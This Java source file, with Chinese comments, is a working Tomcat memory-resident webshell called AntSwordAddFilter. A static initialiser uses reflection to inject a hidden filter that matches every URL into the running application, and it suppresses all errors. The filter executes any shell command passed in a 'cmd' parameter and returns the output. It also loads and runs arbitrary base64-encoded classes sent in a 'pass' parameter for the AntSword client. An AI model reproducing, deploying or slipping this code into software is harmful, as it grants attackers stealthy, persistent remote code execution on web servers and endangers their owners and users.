import javax.servlet.*;
import java.io.IOException;
import org.apache.catalina.core.ApplicationFilterConfig;
import org.apache.catalina.Context;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.loader.WebappClassLoaderBase;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import java.util.Map;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.Scanner;
import java.io.InputStream;
// tomcat89
import org.apache.tomcat.util.descriptor.web.FilterDef;
import org.apache.tomcat.util.descriptor.web.FilterMap;

public class AntSwordAddFilter extends ClassLoader implements Filter {

    static{
        try{
            final String name = "AutoAddFilter";
            final String urlPattern = "/*";
            // 获取 standardContext
            /* org.apache.catalina.core.StandardContext容器类负责存储整个Web应用程序的数据和对象，并加载了web.xml中配置
               的多个Servlet、Filter对象以及它们的映射关系。*/
            WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
            StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();

            Field Configs = Class.forName("org.apache.catalina.core.StandardContext").getDeclaredField("filterConfigs");
            Configs.setAccessible(true);
            Map filterConfigs = (Map) Configs.get(standardContext);

            if (filterConfigs.get(name) == null){
                ClassLoader z = null;
                Filter filter = new AntSwordAddFilter(z);

                // 生成 FilterDef
                // filterDefs 成员变量成员变量是一个HashMap对象，存储了filter名称与相应FilterDef的对象的键值对
                // FilterDef 对象则存储了Filter包括名称、描述、类名、Filter实例在内等与filter自身相关的数据
                FilterDef filterDef = new FilterDef();
                filterDef.setFilter(filter);
                filterDef.setFilterName(name);
                filterDef.setFilterClass(filter.getClass().getName());
                standardContext.addFilterDef(filterDef);

                // 设置 FilterMap
                // 使用 addFilterMapBefore 会自动把我们创建的 filterMap 丢到第一位去，无需在手动排序了,其他中间件应该也是类似的
                // filterMaps 中的FilterMap则记录了不同filter与UrlPattern的映射关系
                FilterMap filterMap = new FilterMap();
                filterMap.addURLPattern("/*");
                filterMap.setFilterName(name);
                filterMap.setDispatcher(DispatcherType.REQUEST.name());
                standardContext.addFilterMapBefore(filterMap);

                //设置 FilterConfig
                //在ApplicationFilterConfig对象中则存储了Filter实例以及该实例在web.xml中的注册信息
                Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);
                constructor.setAccessible(true);
                ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);
                filterConfigs.put(name,filterConfig);
            }
        }catch (Exception hi){
            //hi.printStackTrace();
        }
    }
    public void init(FilterConfig config) throws ServletException {
        System.out.println("AntSwordAddFilter Start ......");
    }

    public void destroy() {
    }

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain chain) throws ServletException, IOException {
        try {
            System.out.println("Do Filter ......");
            // 获取request和response对象
            HttpServletRequest request = (HttpServletRequest) servletRequest;
            HttpServletResponse response = (HttpServletResponse)servletResponse;
            HttpSession session = request.getSession();

            // Cmd MemShell
            String cmd = request.getParameter("cmd");
            if(cmd != null && !cmd.isEmpty()){
                boolean isLinux = true;
                String osTyp = System.getProperty("os.name");
                if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                    isLinux = false;
                }
                String[] cmds = isLinux ? new String[]{"/bin/sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
                InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
                Scanner s = new Scanner(in).useDelimiter("\\A");
                String output = s.hasNext() ? s.next() : "";
                response.getWriter().write(output);
                response.getWriter().flush();
            }

            // AntSword MemShell
            String Pwd = "pass";
            String cls = request.getParameter(Pwd);
            if (cls != null) {
                (new AntSwordAddFilter(getClass().getClassLoader())).g(base64Decode(cls)).newInstance().equals(new Object[] { request, response });
            }
        }catch (Exception e){
            e.printStackTrace();
        }
        chain.doFilter(servletRequest, servletResponse);
    }

    public AntSwordAddFilter(ClassLoader z) {
        super(z);
    }

    public Class g(byte[] b) {
        return defineClass(b, 0, b.length);
    }

    public byte[] base64Decode(String str) throws Exception {
        try {
            Class<?> clazz = Class.forName("sun.misc.BASE64Decoder");
            return (byte[])clazz.getMethod("decodeBuffer", new Class[] { String.class }).invoke(clazz.newInstance(), new Object[] { str });
        } catch (Exception e) {
            Class<?> clazz = Class.forName("java.util.Base64");
            Object decoder = clazz.getMethod("getDecoder", new Class[0]).invoke(null, new Object[0]);
            return (byte[])decoder.getClass().getMethod("decode", new Class[] { String.class }).invoke(decoder, new Object[] { str });
        }
    }
}
